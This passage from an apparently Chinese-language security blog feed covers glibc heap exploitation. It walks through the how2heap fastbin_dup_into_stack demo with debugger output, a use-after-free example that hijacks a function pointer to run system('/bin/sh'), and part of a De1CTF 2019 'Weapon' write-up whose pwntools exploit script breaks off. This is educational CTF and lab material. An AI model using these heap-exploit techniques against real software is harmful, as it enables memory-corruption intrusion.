class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"The address we want malloc() to return is %p.\n"</span>, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">fprintf(stderr, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line"><span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">fprintf(stderr, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">fprintf(stderr, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line"><span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line"><span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line"><span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, malloc(8));</span><br><span class="line">fprintf(stderr, <span class="string">"4th malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-理解"><a href="#0x02-理解" class="headerlink" title="0x02 理解"></a>0x02 理解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">程序通用malloc了三个chunk，紧接着通过fastbin double free的操作形成了如下freelist。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20：0x603000-▸0x603020◂-0x603000</span><br><span class="line">0x30：0x0</span><br><span class="line">0x40：0x0</span><br><span class="line">0x50：0x0</span><br><span class="line">0x60：0x0</span><br><span class="line">0x70：0x0</span><br><span class="line">0x80：0x0</span><br><span class="line"></span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">fprintf(stderr, <span class="string">"2nd malloc(8): %p\n"</span>, malloc(8));</span><br><span class="line">fprintf(stderr, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">fprintf(stderr, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line"><span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line"><span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line"><span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">malloc chunk d</span><br><span class="line"></span><br><span class="line">这个时候程序会从fastbins里取一个，由于fastbins是LIFO（Last <span class="keyword">in</span> First out）.chunk A会被取出使用。倘若我们这个时候能对chunk D进行操作，如d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));由于stack_var = 0x20;这样的定义是在函数内，所以stack_var的地址将在栈上，通过对指针d的操作，我们可以伪造一个chunk，并将这个chunk放在栈上。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/20a 0x603000</span><br><span class="line">0x603000:   0x0 0x21</span><br><span class="line">0x603010:   0x7fffffffe388  0x0</span><br><span class="line">0x603020:   0x0 0x21</span><br><span class="line">0x603030:   0x603000    0x0</span><br><span class="line">0x603040:   0x0 0x21</span><br><span class="line">0x603050:   0x0 0x0</span><br><span class="line">0x603060:   0x0 0x20fa1</span><br><span class="line">0x603070:   0x0 0x0</span><br><span class="line">0x603080:   0x0 0x0</span><br><span class="line">0x603090:   0x0 0x0</span><br><span class="line">Pwndbg&gt; x/20a 0x7fffffffe388</span><br><span class="line">0x7fffffffe388: 0x40097c &lt;main+758&gt; 0x20</span><br><span class="line">0x7fffffffe398: 0x603010    0x603030</span><br><span class="line">0x7fffffffe3a8: 0x603050    0x603010</span><br><span class="line">0x7fffffffe3b8: 0xc3e158ae04ceee00  0x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe3c8: 0x7ffff7a303f1 &lt;__libc_start_main+241&gt;  0x40000</span><br><span class="line">0x7fffffffe3d8: 0x7fffffffe4a8  0x1f7b9a488</span><br><span class="line">0x7fffffffe3e8: 0x400686 &lt;main&gt; 0x0</span><br><span class="line">0x7fffffffe3f8: 0x4ffa6e8ae3316c56  0x400590 &lt;_start&gt;</span><br><span class="line">0x7fffffffe408: 0x7fffffffe4a0  0x0</span><br><span class="line">0x7fffffffe418: 0x0 0xb00591f537d16c56</span><br><span class="line">Pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffe390 ◂— 0x20 /* <span class="string">' '</span> */</span><br><span class="line">01:0008│      0x7fffffffe398 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">02:0010│      0x7fffffffe3a0 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffe3a8 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffe3b0 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8</span><br><span class="line">05:0028│      0x7fffffffe3b8 ◂— 0xc3e158ae04ceee00</span><br><span class="line">06:0030│ rbp  0x7fffffffe3c0 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffe3c8 —▸ 0x7ffff7a303f1 (__libc_start_main+241) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffe3d0 ◂— 0x40000</span><br><span class="line">09:0048│      0x7fffffffe3d8 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6ea ◂— 0x77732f656d6f682f (<span class="string">'/home/sw'</span>)</span><br><span class="line"></span><br><span class="line">stack_var = 0x20; 是由于伪造的chunk要由设置size，size的位置位于地址-0x8的地方。</span><br><span class="line"></span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (<span class="keyword">in</span> this <span class="keyword">case</span>, the stack).</span><br><span class="line">The address we want malloc() to <span class="built_in">return</span> is 0x7fff02a085c8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x146b010</span><br><span class="line">2nd malloc(8): 0x146b030</span><br><span class="line">3rd malloc(8): 0x146b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.</span><br><span class="line">So, instead, we<span class="string">'ll free 0x146b030.</span></span><br><span class="line"><span class="string">Now, we can free 0x146b010 again, since it'</span>s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We<span class="string">'ll now carry out our attack by modifying data at 0x146b010.</span></span><br><span class="line"><span class="string">1st malloc(8): 0x146b010</span></span><br><span class="line"><span class="string">2nd malloc(8): 0x146b030</span></span><br><span class="line"><span class="string">Now the free list has [ 0x146b010 ].</span></span><br><span class="line"><span class="string">Now, we have access to 0x146b010 while it remains at the head of the free list.</span></span><br><span class="line"><span class="string">so now we are writing a fake free size (in this case, 0x20) to the stack,</span></span><br><span class="line"><span class="string">so that malloc will think there is a free chunk there and agree to</span></span><br><span class="line"><span class="string">return a pointer to it.</span></span><br><span class="line"><span class="string">Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.</span></span><br><span class="line"><span class="string">3rd malloc(8): 0x146b010, putting the stack address on the free list</span></span><br><span class="line"><span class="string">4th malloc(8): 0x7fff02a085c8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后效果如上，我们发现当chunk a被拿出来后，由于我们伪造了chunk a的fd，造成如下效果。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pwndbg&gt; fastbins</span></span><br><span class="line"><span class="string">fastbins</span></span><br><span class="line"><span class="string">0x20：0x603000-▸0x7fffffffe388-▸0x603010◂-0x0</span></span><br><span class="line"><span class="string">0x30：0x0</span></span><br><span class="line"><span class="string">0x40：0x0</span></span><br><span class="line"><span class="string">0x50：0x0</span></span><br><span class="line"><span class="string">0x60：0x0</span></span><br><span class="line"><span class="string">0x70：0x0</span></span><br><span class="line"><span class="string">0x80：0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这个时候形成如上的链表结构，这个时候当我们再malloc一块内存的时候，系统会误以为是我们假的chunk是自的的。他会把这块chunk拿出来用。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Pwndbg&gt; heap</span></span><br><span class="line"><span class="string">Top Chunk: 0x603060</span></span><br><span class="line"><span class="string">Last Remainder: 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x603000 FASTBIN &#123;</span></span><br><span class="line"><span class="string">  prev_size = 0x0,</span></span><br><span class="line"><span class="string">  size = 0x21,</span></span><br><span class="line"><span class="string">  fd = 0x7fffffffe388,</span></span><br><span class="line"><span class="string">  bk = 0x0,</span></span><br><span class="line"><span class="string">  fd_nextsize = 0x0,</span></span><br><span class="line"><span class="string">  bk_nextsize = 0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">0x603020 FASTBIN &#123;</span></span><br><span class="line"><span class="string">  prev_size = 0x0,</span></span><br><span class="line"><span class="string">  size = 0x21,</span></span><br><span class="line"><span class="string">  fd = 0x603000,</span></span><br><span class="line"><span class="string">  bk = 0x0,</span></span><br><span class="line"><span class="string">  fd_nextsize = 0x0,</span></span><br><span class="line"><span class="string">  bk_nextsize = 0x21</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">小结：对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了任意地址写 和 任意地址读。</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-源代码&quot;&gt;&lt;a href=&quot;#0x01-源代码&quot; class=&quot;headerlink&quot; title=&quot;0x01 源代码&quot;&gt;&lt;/a&gt;0x01 源代码&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
      <category term="how2heap" scheme="http://yoursite.com/categories/how2heap/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>UAF漏洞</title>
    <link href="http://yoursite.com/2019/08/06/uaf%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/08/06/uaf漏洞/</id>
    <published>2019-08-06T15:05:50.513Z</published>
    <updated>2019-08-06T15:12:03.660Z</updated>
    
    <content type="html"><![CDATA[<p>觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题</p><p>原文：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451</a></p><h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">一段简单的代码 帮助理解</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cstdlib&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1;</span><br><span class="line">    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间</span><br><span class="line">    memcpy(p1,<span class="string">"hello"</span>,10);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1 addr:%x,%s\n"</span>,p1,p1);</span><br><span class="line">    free(p1);//释放内存空间</span><br><span class="line">    char *p2;</span><br><span class="line">    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span><br><span class="line">    memcpy(p1,<span class="string">"world"</span>,10);//对内存进行修改</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p2 addr:%x,%s\n"</span>,p2,p1);//验证</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">1.指针p1申请内存，打印其地址值 </span><br><span class="line">2.然后释放p1 </span><br><span class="line">3.指针p2申请同样大小的内存，打印p2的地址，p1指针指向的值</span><br><span class="line"></span><br><span class="line">p1与p2地址相同，p1指针释放后，p2申请相同的大小的内存，操作系统会将之前给p1的地址分配给p2，修改p2的值，p1也被修改了</span><br><span class="line"></span><br><span class="line">应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</span><br><span class="line"></span><br><span class="line">简单讲就是第一次申请的内存空间在释放过后没有进行内存回收，导致下次申请内存的时候再次使用该内存块，使得以前的内存指针可以访问修改过的内存。</span><br></pre></td></tr></table></figure><h3 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">还是一段简单的程序</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char <span class="built_in">command</span>[])</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="built_in">command</span>);</span><br><span class="line">&#125;</span><br><span class="line">void <span class="built_in">echo</span>(char content[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);</span><br><span class="line">    p1[3]=<span class="built_in">echo</span>;</span><br><span class="line">    p1[3](<span class="string">"hello world\n"</span>);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](<span class="string">"hello again\n"</span>); //p1指针未被置空,虽然free了,但仍可使用.</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的<span class="built_in">echo</span>函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;觉得还是整理一下比较好，可以联系how2heap里的文章帮助理解，最好结合题目来做会比较简单，后面的文章我会做几题&lt;/p&gt;
&lt;p&gt;原文：&lt;a href=&quot;https://blog.csdn.net/qq_31481187/article/details/73612451&quot; 
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>weapon</title>
    <link href="http://yoursite.com/2019/08/06/weapon/"/>
    <id>http://yoursite.com/2019/08/06/weapon/</id>
    <published>2019-08-06T14:44:28.748Z</published>
    <updated>2019-08-06T15:02:01.230Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_CBB()</span><br><span class="line">&#123;</span><br><span class="line">  signed int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input idx :"</span>);</span><br><span class="line">  v1 = sub_AAE();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; 0 &amp;&amp; v1 &gt; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(0);</span><br><span class="line">  &#125;</span><br><span class="line">  free(*((void **)&amp;unk_202060 + 2 * v1));</span><br><span class="line">  puts(<span class="string">"Done!"</span>);</span><br><span class="line">  <span class="built_in">return</span> __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">一个uaf漏洞 我就看到了这些 尴尬</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.double free使得heap可控</span><br><span class="line"></span><br><span class="line">2.利用unsorted bin留下的脚印爆破stdout，改stdout泄露地址</span><br><span class="line"></span><br><span class="line">3.劫持hook</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">还不是很懂</span><br><span class="line"> 原文：https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Weapon</span><br><span class="line">第一</span><br><span class="line">制作一个假的0x80（超过那个没问题）chunk并释放它。所以我们可以在fd中获取libc然后编辑stdout的结构来泄漏。最终得到shell。</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">def cmd(c):</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,str(c))</span><br><span class="line">def Cmd(c):</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(c))</span><br><span class="line">def add(size,idx,name=<span 